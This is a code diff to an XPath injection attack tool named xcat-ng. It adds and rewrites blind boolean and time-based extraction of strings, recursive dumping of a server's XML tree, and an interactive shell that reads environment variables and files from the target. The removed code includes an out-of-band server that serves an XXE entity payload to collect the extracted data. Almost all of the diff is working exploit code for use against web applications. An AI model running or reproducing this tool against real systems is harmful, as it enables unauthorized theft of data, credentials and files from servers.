 async def detect_features(engine: Engine) -> Dict[str, bool]:
     results: Dict[str, bool] = {}
-    for name, xpath_test in FEATURES:
-        ok = await engine.check(xpath_test)
-        results[name] = ok
-        icon = green("✓") if ok else red("✗")
-        print(f"  {icon} {name}")
+
+    async def probe(feat: Feature):
+        try:
+            results[feat.name] = await engine.check(feat.test_expr)
+        except Exception:
+            results[feat.name] = False
+
+    await asyncio.gather(*[probe(f) for f in FEATURES])
+
+    for feat in FEATURES:
+        val  = results.get(feat.name, False)
+        icon = _c("✓", T.GREEN) if val else _c("✗", T.RED)
+        print(f"  {icon} {feat.name:<32} {_c(feat.description, T.GRAY)}")
+
     return results
 
-# ─────────────────────────────────────────────
-# BINARY SEARCH
-# ─────────────────────────────────────────────
 
-async def binary_search(engine: Engine, count_expr: str, lo: int = 0, hi: int = 50) -> int:
-    """Binary-search the integer value of count_expr."""
-    # Expand hi if needed
-    if await engine.check(f"{count_expr} > {hi}"):
-        return await binary_search(engine, count_expr, lo, hi * 2)
+# ══════════════════════════════════════════════════════════════════════════════
+# Binary search
+# ══════════════════════════════════════════════════════════════════════════════
+
+async def binary_search(engine: Engine, expr: str, lo: int = 0, hi: int = 50) -> int:
+    """Find the integer value of a numeric XPath expression."""
+    if await engine.check(f"({expr}) > {hi}"):
+        return await binary_search(engine, expr, lo, hi * 2)
     while lo <= hi:
         mid = (lo + hi) // 2
-        if await engine.check(f"{count_expr} < {mid}"):
+        if await engine.check(f"({expr}) < {mid}"):
             hi = mid - 1
-        elif await engine.check(f"{count_expr} > {mid}"):
+        elif await engine.check(f"({expr}) > {mid}"):
             lo = mid + 1
         else:
             return mid
     return -1
 
-# ─────────────────────────────────────────────
-# CHARACTER EXTRACTION
-# ─────────────────────────────────────────────
 
-async def get_char_codepoint(engine: Engine, expr: str) -> Optional[str]:
-    code = await binary_search(engine, f"string-to-codepoints({expr})[1]", lo=0, hi=127)
-    return chr(code) if code > 0 else None
+# ══════════════════════════════════════════════════════════════════════════════
+# Character extraction
+# ══════════════════════════════════════════════════════════════════════════════
+
+async def _char_codepoint(engine: Engine, pos_expr: str) -> Optional[str]:
+    """O(log N) binary search via string-to-codepoints (XPath 2.0)."""
+    code = await binary_search(engine, f"string-to-codepoints({pos_expr})[1]", lo=32, hi=126)
+    return chr(code) if 32 <= code <= 126 else None
 
 
-async def get_char_substring(engine: Engine, expr: str) -> Optional[str]:
-    space = ASCII_SEARCH_SPACE
-    # Check first char explicitly (substring-before edge case)
-    if await engine.check(f"{expr}='{space[0]}'"):
+async def _char_substring(engine: Engine, pos_expr: str) -> Optional[str]:
+    """O(log N) binary search via substring-before on CHARSET_FREQ."""
+    space = CHARSET_FREQ
+    if await engine.check(f"{pos_expr}='{space[0]}'"):
         return space[0]
-    idx = await binary_search(engine, f"string-length(substring-before('{space}',{expr}))",
-                              lo=0, hi=len(space))
+    idx = await binary_search(
+        engine,
+        f"string-length(substring-before('{space}',{pos_expr}))",
+        lo=0, hi=len(space)
+    )
     return space[idx] if 0 < idx < len(space) else None
 
 
-async def get_char_linear(engine: Engine, expr: str, charset: Counter) -> Optional[str]:
-    """Linear scan with adaptive ordering."""
-    ordered = [c for c, _ in charset.most_common()] + \
-              [c for c in ASCII_SEARCH_SPACE if c not in charset]
-    for ch in ordered:
-        safe = ch.replace("'", "\\'")
-        if await engine.check(f"substring({expr},1,1)='{safe}'"):
-            charset[ch] += 1
+async def _char_linear(engine: Engine, pos_expr: str, ctx: AttackContext) -> Optional[str]:
+    """O(N) frequency-ordered linear scan."""
+    for ch in ctx.ordered_charset():
+        q = '"' if ch == "'" else "'"
+        if await engine.check(f"{pos_expr}={q}{ch}{q}"):
+            ctx.char_freq[ch] += 1
             return ch
     return None
 
 
-async def get_char(engine: Engine, expr: str) -> Optional[str]:
-    """Choose best strategy based on detected features."""
-    feats = engine.ctx.features
-    if feats.get("codepoint-search"):
-        return await get_char_codepoint(engine, expr)
-    elif feats.get("substring-search"):
-        return await get_char_substring(engine, expr)
-    else:
-        return await get_char_linear(engine, expr, engine.ctx.common_characters)
-
-# ─────────────────────────────────────────────
-# STRING EXTRACTION
-# ─────────────────────────────────────────────
-
-async def get_string_length(engine: Engine, expr: str) -> int:
-    return await binary_search(engine, f"string-length({expr})", lo=0, hi=50)
+async def get_char(engine: Engine, expr: str, pos: int) -> Optional[str]:
+    ctx      = engine.ctx
+    pos_expr = f"substring({expr},{pos},1)"
+    if ctx.has("codepoint-search"):
+        return await _char_codepoint(engine, pos_expr)
+    if ctx.has("substring-search"):
+        return await _char_substring(engine, pos_expr)
+    return await _char_linear(engine, pos_expr, ctx)
 
 
-async def get_string_boolean(engine: Engine, expr: str, fast: bool = False) -> str:
-    """Extract a string char-by-char via boolean oracle."""
-    feats = engine.ctx.features
-    if feats.get("normalize-space"):
-        expr = f"normalize-space({expr})"
+# ══════════════════════════════════════════════════════════════════════════════
+# String extraction — boolean mode
+# ══════════════════════════════════════════════════════════════════════════════
 
-    total = await get_string_length(engine, expr)
+async def get_string(engine: Engine, expr: str,
+                     label: Optional[str] = None,
+                     fast: bool = False) -> str:
+    """
+    Extract the string value of an XPath expression character by character.
+    Displays a live progress bar on stderr while working.
+    Returns the extracted string (with MISSING_CHAR placeholders for unknowns).
+    """
+    ctx = engine.ctx
+    work = f"normalize-space({expr})" if ctx.has("normalize-space") else expr
+
+    total = await binary_search(engine, f"string-length({work})", lo=0, hi=50)
     if total <= 0:
         return ""
 
-    # Try common strings first
-    ctx = engine.ctx
-    candidates = [s for s, _ in ctx.common_strings.most_common() if len(s) == total][:5]
+    # Try cached common strings first (avoids char-by-char for known values)
+    candidates = [s for s, _ in ctx.common_strs.most_common() if len(s) == total][:5]
     if candidates:
-        checks = await asyncio.gather(*[engine.check(f"{expr}='{c}'") for c in candidates])
-        for ok, s in zip(checks, candidates):
-            if ok:
-                ctx.common_strings[s] += 1
+        hits = await asyncio.gather(*[engine.check(f"{work}='{c}'") for c in candidates])
+        for hit, s in zip(hits, candidates):
+            if hit:
+                ctx.common_strs[s] += 1
                 return s
 
-    fetch_len = min(FAST_MODE_CHARS, total) if fast else total
-    futures   = [get_char(engine, f"substring({expr},{i},1)") for i in range(1, fetch_len + 1)]
-    chars     = await asyncio.gather(*futures)
+    fetch_len = min(FAST_MODE_LEN, total) if fast else total
+    lbl       = (label or expr.split("(")[0][:18])
 
-    result = "".join(c if c else MISSING_CHAR for c in chars)
+    chars = [MISSING_CHAR] * fetch_len
+    done  = [0]
 
+    async def fetch(pos: int):
+        ch = await get_char(engine, work, pos)
+        chars[pos - 1] = ch or MISSING_CHAR
+        done[0] += 1
+        _progress(lbl, done[0], fetch_len, "".join(chars))
+
+    await asyncio.gather(*[fetch(i) for i in range(1, fetch_len + 1)])
+    print(file=sys.stderr)  # newline after progress bar
+
+    result = "".join(chars)
     if fast and fetch_len < total:
-        result += f"... ({total - fetch_len} more)"
-    elif total <= 10:
-        ctx.common_strings[result] += 1
+        result += f"... (+{total - fetch_len})"
+    elif total <= 12:
+        ctx.common_strs[result] += 1
 
     return result
 
-# ─────────────────────────────────────────────
-# NORMAL EXTRACTION  (regex / diff)
-# ─────────────────────────────────────────────
 
-async def extract_normal(
-    engine: Engine, param: str, injector: Injector,
-    patterns: Optional[List[str]] = None
-) -> Optional[str]:
-    """
-    NORMAL mode: отправляем «всегда-true» payload и пытаемся вытащить
-    значение из ответа через regex или diff с baseline.
-    """
-    working = engine.ctx.req.all_params.get(param, "")
-    true_pl, _ = injector.test_payloads(working)[0]
-    _, base_body   = await engine.baseline()
-    _, true_body, _ = await engine.send_raw({param: true_pl})
+async def get_count(engine: Engine, expr: str) -> int:
+    return await binary_search(engine, f"count({expr})", lo=0)
 
-    # 1) Пользовательские паттерны
-    if patterns:
-        for pat in patterns:
-            m = re.search(pat, true_body)
-            if m:
-                return m.group(1) if m.lastindex else m.group(0)
 
-    # 2) Автоматические паттерны (XML-теги, JSON-строки, HTML-значения)
-    auto_patterns = [
-        r"<value[^>]*>([^<]+)</value>",
-        r"<result[^>]*>([^<]+)</result>",
-        r"<text[^>]*>([^<]+)</text>",
-        r'"result"\s*:\s*"([^"]+)"',
-        r'"value"\s*:\s*"([^"]+)"',
-    ]
-    for pat in auto_patterns:
-        m = re.search(pat, true_body, re.IGNORECASE)
-        if m:
-            return m.group(1)
+# ══════════════════════════════════════════════════════════════════════════════
+# String extraction — time-based mode
+# ══════════════════════════════════════════════════════════════════════════════
 
-    # 3) Diff: найти строки, присутствующие в true, но не в baseline
-    base_lines = set(base_body.splitlines())
-    extra      = [l.strip() for l in true_body.splitlines()
-                  if l.strip() and l.strip() not in base_lines]
-    if extra:
-        return "\n".join(extra[:10])
+async def get_string_time(engine: Engine, expr: str,
+                          threshold: float, fast: bool = False) -> str:
+    """Extract a string using a timing oracle."""
+    ctx = engine.ctx
 
-    return None
-
-# ─────────────────────────────────────────────
-# TIME-BASED STRING EXTRACTION
-# ─────────────────────────────────────────────
-
-async def get_string_time(engine: Engine, expr: str, threshold: float, fast: bool = False) -> str:
-    """Extract a string via time-based oracle."""
+    # Estimate string length
     total = 0
-    # Estimate length via time-bomb
     for length in range(1, 65):
         bomb = f"string-length({expr}) >= {length} and {TIME_BOMB}>0"
-        _, _, t = await engine.send_expr(bomb)
+        _, _, t = await engine.send_condition(bomb)
         if t < threshold:
             total = length - 1
             break
     if total == 0:
-        total = 10  # fallback
+        total = 10
 
-    fetch_len = min(FAST_MODE_CHARS, total) if fast else total
-    result    = []
+    fetch_len = min(FAST_MODE_LEN, total) if fast else total
+    chars: List[str] = []
 
     for pos in range(1, fetch_len + 1):
         found = False
-        for ch in ASCII_SEARCH_SPACE:
-            safe = ch.replace("'", "\\'")
-            bomb = f"substring({expr},{pos},1)='{safe}' and {TIME_BOMB}>0"
-            _, _, t = await engine.send_expr(bomb)
+        for ch in ctx.ordered_charset():
+            q    = '"' if ch == "'" else "'"
+            bomb = f"substring({expr},{pos},1)={q}{ch}{q} and {TIME_BOMB}>0"
+            _, _, t = await engine.send_condition(bomb)
             if t >= threshold:
-                result.append(ch)
+                chars.append(ch)
+                ctx.char_freq[ch] += 1
                 found = True
                 break
         if not found:
-            result.append(MISSING_CHAR)
+            chars.append(MISSING_CHAR)
+        _progress(expr[:18], pos, fetch_len, "".join(chars))
 
-    s = "".join(result)
+    print(file=sys.stderr)
+    result = "".join(chars)
     if fast and fetch_len < total:
-        s += f"... ({total - fetch_len} more)"
-    return s
-
-# ─────────────────────────────────────────────
-# BFS XML TRAVERSAL
-# ─────────────────────────────────────────────
-
-@dataclass
-class XMLNode:
-    name:       str
-    attributes: Dict[str, str]
-    text:       str
-    children:   List["XMLNode"] = field(default_factory=list)
-    comments:   List[str]       = field(default_factory=list)
+        result += f"... (+{total - fetch_len})"
+    return result
 
 
-async def get_node_count(engine: Engine, path_expr: str) -> int:
-    return await binary_search(engine, f"count({path_expr})", lo=0)
+# ══════════════════════════════════════════════════════════════════════════════
+# XML tree exfiltration with live output
+# ══════════════════════════════════════════════════════════════════════════════
 
-
-async def get_node_attrib_count(engine: Engine, path_expr: str) -> int:
-    return await binary_search(engine, f"count({path_expr}/@*)", lo=0)
-
-
-async def get_nodes_bfs(engine: Engine, root_expr: str = "/*", depth: int = 0, max_depth: int = 10) -> List[XMLNode]:
+async def exfiltrate_node(
+    engine:       Engine,
+    xpath:        str,
+    depth:        int = 0,
+    max_depth:    int = 12,
+    max_children: int = 40,
+    xml_lines:    Optional[List[str]] = None,
+    method:       ExtractionMethod = ExtractionMethod.BOOLEAN,
+    threshold:    float = 0.0,
+    fast:         bool = False,
+) -> None:
     """
-    BFS-обход XML-дерева начиная с root_expr.
-    Для каждого узла извлекает: name, attrs, text, children.
+    Recursively extract an XML node and its subtree.
+    Each tag and value is printed to stdout immediately when found (live output).
+    All lines are also accumulated in xml_lines for the final summary.
+    Progress bars are shown on stderr.
     """
-    if depth > max_depth:
-        return []
+    indent = "  " * depth
+    ctx    = engine.ctx
 
-    nodes: List[XMLNode] = []
+    async def gs(expr: str, lbl: str = "") -> str:
+        if method == ExtractionMethod.TIME:
+            return await get_string_time(engine, expr, threshold, fast or ctx.fast_mode)
+        return await get_string(engine, expr, label=lbl or expr[:18], fast=fast or ctx.fast_mode)
 
-    node_count = await get_node_count(engine, root_expr)
-    if node_count < 0:
-        node_count = 1  # хотя бы один
+    # Extract node name
+    name = await gs(f"name({xpath})", lbl="name")
+    if not name:
+        name = f"node_{depth}"
 
-    for i in range(1, node_count + 1):
-        path = f"({root_expr})[{i}]" if node_count > 1 else root_expr
+    # Extract attributes
+    attr_count = await get_count(engine, f"{xpath}/@*")
+    attrs: Dict[str, str] = {}
+    for ai in range(1, attr_count + 1):
+        aname = await gs(f"name(({xpath}/@*)[{ai}])", lbl="@name")
+        aval  = await gs(f"string(({xpath}/@*)[{ai}])", lbl="@val")
+        if aname:
+            attrs[aname] = aval
 
-        # node name
-        name = await get_string_boolean(engine, f"name({path})", fast=False)
+    attr_str = " ".join(f'{k}="{v}"' for k, v in attrs.items())
+    open_tag = f"{indent}<{name}{' ' + attr_str if attr_str else ''}>"
 
-        # attributes
-        attrs: Dict[str, str] = {}
-        attr_count = await get_node_attrib_count(engine, path)
-        for ai in range(1, attr_count + 1):
-            attr_path = f"{path}/@*[{ai}]"
-            aname  = await get_string_boolean(engine, f"name({attr_path})")
-            avalue = await get_string_boolean(engine, f"string({attr_path})")
-            if aname:
-                attrs[aname] = avalue
+    # Print open tag immediately as soon as name is known
+    print(_c(open_tag, T.CYAN))
+    if xml_lines is not None:
+        xml_lines.append(open_tag)
 
-        # text content
-        text_parts = []
-        text_count = await binary_search(engine, f"count({path}/text())", lo=0)
-        for ti in range(1, text_count + 1):
-            t = await get_string_boolean(engine, f"string({path}/text()[{ti}])")
-            text_parts.append(t)
-        text = "".join(text_parts).strip()
+    n_children = await get_count(engine, f"{xpath}/*")
 
-        # children — recurse
-        child_count = await binary_search(engine, f"count({path}/*)", lo=0)
-        children: List[XMLNode] = []
-        if child_count > 0:
-            children = await get_nodes_bfs(engine, f"{path}/*", depth + 1, max_depth)
+    if n_children == 0 or depth >= max_depth:
+        # Leaf: extract text value
+        value = await gs(f"string({xpath})", lbl=name[:18])
+        if value:
+            val_line = f"{indent}  {value}"
+            print(_c(val_line, T.GREEN))
+            if xml_lines is not None:
+                xml_lines.append(val_line)
+    else:
+        n_children = min(n_children, max_children)
+        for i in range(1, n_children + 1):
+            await exfiltrate_node(
+                engine, f"({xpath}/*)[{i}]",
+                depth + 1, max_depth, max_children,
+                xml_lines, method, threshold, fast,
+            )
 
-        nodes.append(XMLNode(name=name or f"node{i}", attributes=attrs, text=text, children=children))
+    close_tag = f"{indent}</{name}>"
+    print(_c(close_tag, T.CYAN))
+    if xml_lines is not None:
+        xml_lines.append(close_tag)
 
-    return nodes
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Interactive shell
+# ══════════════════════════════════════════════════════════════════════════════
+
+SHELL_HELP = f"""
+{_c("xcat-ng interactive shell", T.BOLD)}
+
+  {_c("get  <xpath>", T.CYAN)}         Extract string value of any XPath expression
+  {_c("count <xpath>", T.CYAN)}        Count nodes matching expression
+  {_c("xml  [xpath]", T.CYAN)}         Dump XML subtree (default: /*)
+  {_c("env  [name]", T.CYAN)}          List env vars or get a specific one by name
+  {_c("file <path>", T.CYAN)}          Read a file via unparsed-text() or doc()
+  {_c("pwd", T.CYAN)}                  Print server working directory
+  {_c("time", T.CYAN)}                 Print server date/time
+  {_c("find <name>", T.CYAN)}          Search for a file in parent directories
+  {_c("features", T.CYAN)}             Show all detected feature flags
+  {_c("toggle <feature>", T.CYAN)}     Toggle a feature on/off manually
+  {_c("help", T.CYAN)}                 Show this message
+  {_c("exit / quit", T.CYAN)}          Exit the shell
+"""
 
 
-def print_xml_tree(nodes: List[XMLNode], indent: int = 0) -> None:
-    pad = "  " * indent
-    for node in nodes:
-        attr_str = " ".join(f'{k}="{v}"' for k, v in node.attributes.items())
-        open_tag = f"<{node.name}{' ' + attr_str if attr_str else ''}>"
-        print(f"{pad}{green(open_tag)}")
-        if node.text:
-            print(f"{pad}  {node.text}")
-        for child in node.children:
-            print_xml_tree([child], indent + 1)
-        print(f"{pad}{green('</' + node.name + '>')}")
+async def shell_loop(engine: Engine, method: ExtractionMethod, threshold: float):
+    ctx = engine.ctx
+    print(SHELL_HELP)
 
-# ─────────────────────────────────────────────
-# OOB SERVER
-# ─────────────────────────────────────────────
+    async def gs(expr: str, lbl: str = "") -> str:
+        if method == ExtractionMethod.TIME:
+            return await get_string_time(engine, expr, threshold, ctx.fast_mode)
+        return await get_string(engine, expr, label=lbl or expr[:18], fast=ctx.fast_mode)
 
-try:
-    from aiohttp import web as aio_web
+    while True:
+        try:
+            line = input(f"{_c('XCat', T.RED)}{_c('$ ', T.GREEN)}").strip()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            break
+        if not line:
+            continue
+        parts = shlex.split(line)
+        cmd, args = parts[0].lower(), parts[1:]
 
-    ENTITY_TPL = (
-        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
-        '<!DOCTYPE stuff [<!ELEMENT data ANY> <!ENTITY goodies {0}>]>'
-        '<data>&goodies;</data>'
-    )
-
-    _OOB_EXPECTATIONS: Dict[str, asyncio.Future] = {}
-    _OOB_ENTITY_VALS:  Dict[str, str]            = {}
-    _OOB_TEST_VALUE    = str(__import__("random").randint(1, 999999))
-
-    async def _oob_test(req: aio_web.Request) -> aio_web.Response:
-        return aio_web.Response(body=f"<data>{_OOB_TEST_VALUE}</data>", content_type="text/xml")
-
-    async def _oob_data(req: aio_web.Request) -> aio_web.Response:
-        eid = req.match_info["id"]
-        if eid not in _OOB_EXPECTATIONS:
-            return aio_web.Response(status=404)
-        data = req.rel_url.query_string
-        if data.startswith("d="):
-            data = __import__("urllib.parse", fromlist=["unquote"]).unquote(data[2:])
-        fut = _OOB_EXPECTATIONS[eid]
-        if not fut.done():
-            fut.set_result(data)
-        return aio_web.Response(body=f"<data>{_OOB_TEST_VALUE}</data>", content_type="text/xml")
-
-    async def _oob_entity(req: aio_web.Request) -> aio_web.Response:
-        eid = req.match_info["id"]
-        if eid not in _OOB_ENTITY_VALS:
-            return aio_web.Response(status=404)
-        val  = _OOB_ENTITY_VALS[eid]
-        body = ENTITY_TPL.format(val)
-        return aio_web.Response(body=body, content_type="text/xml")
-
-    def _create_oob_app() -> aio_web.Application:
-        app = aio_web.Application()
-        app.router.add_get("/test/data",   _oob_test)
-        app.router.add_get("/data/{id}",   _oob_data)
-        app.router.add_get("/entity/{id}", _oob_entity)
-        return app
-
-    async def start_oob_server(host: str, port: int):
-        app    = _create_oob_app()
-        runner = aio_web.AppRunner(app)
-        await runner.setup()
-        site   = aio_web.TCPSite(runner, "0.0.0.0", port)
-        await site.start()
-        print(f"[OOB] Listening on 0.0.0.0:{port}, external: {host}:{port}")
-        return runner
-
-    HAS_OOB = True
-except ImportError:
-    HAS_OOB = False
-    print("[!] aiohttp not installed — OOB server disabled (pip install aiohttp)", file=sys.stderr)
-
-# ─────────────────────────────────────────────
-# INTERACTIVE SHELL
-# ─────────────────────────────────────────────
-
-class Shell:
-    def __init__(self, engine: Engine):
-        self.engine = engine
-        self.ctx    = engine.ctx
-        self._cmds: Dict[str, Callable] = {
-            "get":        self.cmd_get,
-            "get-string": self.cmd_get_string,
-            "cat":        self.cmd_cat,
-            "env":        self.cmd_env,
-            "pwd":        self.cmd_pwd,
-            "time":       self.cmd_time,
-            "find":       self.cmd_find,
-            "features":   self.cmd_features,
-            "toggle":     self.cmd_toggle,
-            "help":       self.cmd_help,
-            "exit":       self.cmd_exit,
-            "quit":       self.cmd_exit,
-        }
-
-    async def run(self):
-        print(bold("\nxcat-ng shell  —  type 'help' for commands\n"))
-        while True:
-            try:
-                line = input(f"{red('XCat')} {green('$')} ").strip()
-            except (EOFError, KeyboardInterrupt):
-                print()
+        try:
+            if cmd in ("exit", "quit"):
                 break
-            if not line:
-                continue
-            parts = shlex.split(line)
-            cmd, args = parts[0], parts[1:]
-            if cmd not in self._cmds:
-                print(f"Unknown command '{cmd}'. Try 'help'.")
-                continue
-            try:
-                await self._cmds[cmd](args)
-            except Exception as exc:
-                print(f"Error: {exc}")
 
-    async def cmd_help(self, _):
-        for name, fn in self._cmds.items():
-            doc = (fn.__doc__ or "").strip().split("\n")[0]
-            print(f"  {green(name):20s} {doc}")
+            elif cmd == "help":
+                print(SHELL_HELP)
 
-    async def cmd_exit(self, _):
-        """Exit the shell."""
-        sys.exit(0)
+            elif cmd == "get":
+                if not args:
+                    err("Usage: get <xpath>"); continue
+                print(_c(await gs(args[0]), T.GREEN))
 
-    async def cmd_get(self, args):
-        """[xpath]  BFS-traverse and print XML node tree."""
-        expr = args[0] if args else "/*"
-        nodes = await get_nodes_bfs(self.engine, expr)
-        print_xml_tree(nodes)
+            elif cmd == "count":
+                if not args:
+                    err("Usage: count <xpath>"); continue
+                n = await get_count(engine, args[0])
+                print(_c(str(n), T.GREEN))
 
-    async def cmd_get_string(self, args):
-        """[xpath]  Evaluate XPath and return a string."""
-        if not args:
-            print("Usage: get-string [xpath]")
-            return
-        val = await get_string_boolean(self.engine, args[0], self.ctx.fast_mode)
-        print(val)
+            elif cmd == "xml":
+                xpath     = args[0] if args else "/*"
+                xml_lines: List[str] = []
+                await exfiltrate_node(engine, xpath,
+                                      xml_lines=xml_lines,
+                                      method=method, threshold=threshold,
+                                      fast=ctx.fast_mode)
+                print()
+                print(_c("═" * 64, T.BOLD))
+                for ln in xml_lines:
+                    s = ln.strip()
+                    print(_c(ln, T.CYAN) if s.startswith("<") else _c(ln, T.GREEN))
+                print(_c("═" * 64, T.BOLD))
 
-    async def cmd_cat(self, args):
-        """[path]  Read a text file via unparsed-text."""
-        if not self.ctx.features.get("unparsed-text"):
-            print(red("Feature 'unparsed-text' not available"))
-            return
-        path = args[0] if args else "doc"
-        expr = f"unparsed-text('{path}')"
-        print(await get_string_boolean(self.engine, expr))
+            elif cmd == "env":
+                if not ctx.has("environment-variables"):
+                    warn("Feature 'environment-variables' not available"); continue
+                if args:
+                    print(_c(await gs(f'environment-variable("{args[0]}")', lbl="env"), T.GREEN))
+                else:
+                    cnt = await get_count(engine, "available-environment-variables()")
+                    for i in range(1, cnt + 1):
+                        name  = await gs(f"available-environment-variables()[{i}]", lbl="env-name")
+                        value = await gs(f'environment-variable("{name}")', lbl="env-val")
+                        print(f"{_c(name, T.CYAN)}={_c(value, T.GREEN)}")
 
-    async def cmd_env(self, _):
-        """List environment variables."""
-        if not self.ctx.features.get("environment-variables"):
-            print(red("Feature 'environment-variables' not available"))
-            return
-        count = await binary_search(self.engine, "count(available-environment-variables())", lo=0)
-        for i in range(1, count + 1):
-            name_expr = f"available-environment-variables()[{i}]"
-            name = await get_string_boolean(self.engine, name_expr)
-            val  = await get_string_boolean(self.engine, f"environment-variable('{name}')")
-            print(f"{green(name)}={val}")
+            elif cmd == "file":
+                if not args:
+                    err("Usage: file <path>"); continue
+                if ctx.has("unparsed-text"):
+                    expr = f'unparsed-text("{args[0]}")'
+                elif ctx.has("doc-function"):
+                    expr = f'string(doc("{args[0]}"))'
+                else:
+                    warn("Neither unparsed-text nor doc() available"); continue
+                print(_c(await gs(expr, lbl="file"), T.GREEN))
 
-    async def cmd_pwd(self, _):
-        """Print working directory (document-uri / base-uri)."""
-        if self.ctx.features.get("base-uri"):
-            expr = "base-uri()"
-        elif self.ctx.features.get("document-uri"):
-            expr = "document-uri(/)"
-        else:
-            print(red("Neither base-uri nor document-uri available"))
-            return
-        print(await get_string_boolean(self.engine, expr))
+            elif cmd == "pwd":
+                if ctx.has("base-uri"):
+                    print(_c(await gs("base-uri()"), T.GREEN))
+                elif ctx.has("document-uri"):
+                    print(_c(await gs("document-uri(/)"), T.GREEN))
+                else:
+                    warn("Neither base-uri nor document-uri available")
 
-    async def cmd_time(self, _):
-        """Print server date/time."""
-        if not self.ctx.features.get("current-datetime"):
-            print(red("Feature 'current-datetime' not available"))
-            return
-        print(await get_string_boolean(self.engine, "string(current-dateTime())"))
+            elif cmd == "time":
+                if not ctx.has("current-datetime"):
+                    warn("Feature 'current-datetime' not available"); continue
+                print(_c(await gs("string(current-dateTime())"), T.GREEN))
 
-    async def cmd_find(self, args):
-        """[name]  Search for file by name in parent directories."""
-        if not args:
-            print("Usage: find [filename]")
-            return
-        name = args[0]
-        for i in range(10):
-            rel = ("../" * i) + name
-            if self.ctx.features.get("doc-function"):
-                if await self.engine.check(f"doc-available(resolve-uri('{rel}', document-uri(/)))"):
-                    print(green(f"[XML] {rel}"))
-            if self.ctx.features.get("unparsed-text"):
-                if await self.engine.check(f"unparsed-text-available(resolve-uri('{rel}', document-uri(/)))"):
-                    print(green(f"[TXT] {rel}"))
+            elif cmd == "find":
+                if not args:
+                    err("Usage: find <filename>"); continue
+                for i in range(10):
+                    rel = ("../" * i) + args[0]
+                    if ctx.has("doc-function"):
+                        if await engine.check(
+                            f"doc-available(resolve-uri('{rel}',document-uri(/)))"
+                        ):
+                            ok(f"[XML] {rel}")
+                    if ctx.has("unparsed-text"):
+                        if await engine.check(
+                            f"unparsed-text-available(resolve-uri('{rel}',document-uri(/)))"
+                        ):
+                            ok(f"[TXT] {rel}")
 
-    async def cmd_features(self, _):
-        """Show detected features."""
-        for k, v in self.ctx.features.items():
-            icon = green("on") if v else red("off")
-            print(f"  {k:30s} {icon}")
+            elif cmd == "features":
+                for k, v in ctx.features.items():
+                    icon = _c("on", T.GREEN) if v else _c("off", T.RED)
+                    print(f"  {k:<34} {icon}")
 
-    async def cmd_toggle(self, args):
-        """[feature]  Toggle a feature on/off."""
-        if not args:
-            await self.cmd_features([])
-            return
-        feat = args[0]
-        self.ctx.features[feat] = not self.ctx.features.get(feat, False)
-        print(f"{feat} → {green('on') if self.ctx.features[feat] else red('off')}")
+            elif cmd == "toggle":
+                if not args:
+                    err("Usage: toggle <feature>"); continue
+                f = args[0]
+                ctx.features[f] = not ctx.features.get(f, False)
+                icon = _c("on", T.GREEN) if ctx.features[f] else _c("off", T.RED)
+                print(f"{f} → {icon}")
 
-# ─────────────────────────────────────────────
-# CONFIDENCE TRACKER
-# ─────────────────────────────────────────────
+            else:
+                err(f"Unknown command '{cmd}'. Type 'help'.")
 
-class Confidence:
-    def __init__(self):
-        self.ok   = 0
-        self.fail = 0
+        except KeyboardInterrupt:
+            print()
+        except Exception as exc:
+            err(f"Error: {exc}")
+            if _verbose:
+                import traceback; traceback.print_exc()
 
-    def update(self, ok: bool):
-        if ok:
-            self.ok   += 1
-        else:
-            self.fail += 1
 
-    def score(self) -> float:
-        total = self.ok + self.fail
-        return self.ok / total if total else 0.0
+# ══════════════════════════════════════════════════════════════════════════════
+# Shared setup
+# ══════════════════════════════════════════════════════════════════════════════
 
-    def __str__(self):
-        return f"{self.score():.0%} ({self.ok}/{self.ok + self.fail})"
+def build_match_fn(args: argparse.Namespace) -> Callable[[int, str], bool]:
+    ts = getattr(args, "true_string",  None)
+    tc = getattr(args, "true_code",    None)
+    fs = getattr(args, "false_string", None)
+    fc = getattr(args, "false_code",   None)
 
-# ─────────────────────────────────────────────
-# RESUME STATE
-# ─────────────────────────────────────────────
-
-class State:
-    def __init__(self, path: Optional[str] = None):
-        self.path = path
-        self.data: Dict[str, Any] = {}
-        if path and os.path.exists(path):
-            with open(path) as f:
-                self.data = json.load(f)
-            print(f"[*] Resumed from {path}")
-
-    def save(self):
-        if self.path:
-            with open(self.path, "w") as f:
-                json.dump(self.data, f, indent=2)
-
-# ─────────────────────────────────────────────
-# MATCH FUNCTION BUILDERS
-# ─────────────────────────────────────────────
-
-def make_match_fn(
-    true_string:  Optional[str] = None,
-    false_string: Optional[str] = None,
-    true_code:    Optional[int] = None,
-    false_code:   Optional[int] = None,
-) -> Callable[[int, str], bool]:
+    ts_neg = tc_neg = False
+    if ts and ts.startswith("!"):
+        ts_neg = True; ts = ts[1:]
+    if tc and str(tc).startswith("!"):
+        tc_neg = True; tc = int(str(tc)[1:])
+    tc_int = int(tc) if tc else None
+    fc_int = int(fc) if fc else None
 
     def fn(status: int, body: str) -> bool:
-        if true_code is not None and status != true_code:
+        if ts:
+            found = ts in body
+            if (found ^ ts_neg) is False:
+                return False
+        if tc_int is not None:
+            match = (status == tc_int)
+            if (match ^ tc_neg) is False:
+                return False
+        if fs and fs in body:
             return False
-        if false_code is not None and status == false_code:
-            return False
-        if true_string is not None and true_string not in body:
-            return False
-        if false_string is not None and false_string in body:
+        if fc_int and status == fc_int:
             return False
         return True
 
     return fn
 
-# ─────────────────────────────────────────────
-# HIGH-LEVEL ATTACK FLOW
-# ─────────────────────────────────────────────
 
-async def run_attack(ctx: AttackContext, state: State, output_xml: bool = True):
-    """Main extraction: BFS XML traversal."""
-    engine = Engine(ctx)
-    await ctx.start()
-    try:
-        baseline_bodies = await build_baseline(engine)
-
-        print(f"\n[*] Detecting features...")
-        feats = await detect_features(engine)
-        ctx.features.update(feats)
-
-        root_expr = state.data.get("root_expr", "/*")
-        print(f"\n[*] Extracting XML tree from {cyan(root_expr)}")
-        nodes = await get_nodes_bfs(engine, root_expr)
-        state.data["nodes_extracted"] = len(nodes)
-        state.save()
-
-        if output_xml:
-            print()
-            print_xml_tree(nodes)
-    finally:
-        await ctx.close()
-
-
-async def run_shell(ctx: AttackContext):
-    engine = Engine(ctx)
-    await ctx.start()
-    try:
-        print("[*] Detecting features...")
-        feats = await detect_features(engine)
-        ctx.features.update(feats)
-        shell = Shell(engine)
-        await shell.run()
-    finally:
-        await ctx.close()
-
-
-async def run_detect(ctx: AttackContext):
-    engine = Engine(ctx)
-    await ctx.start()
-    try:
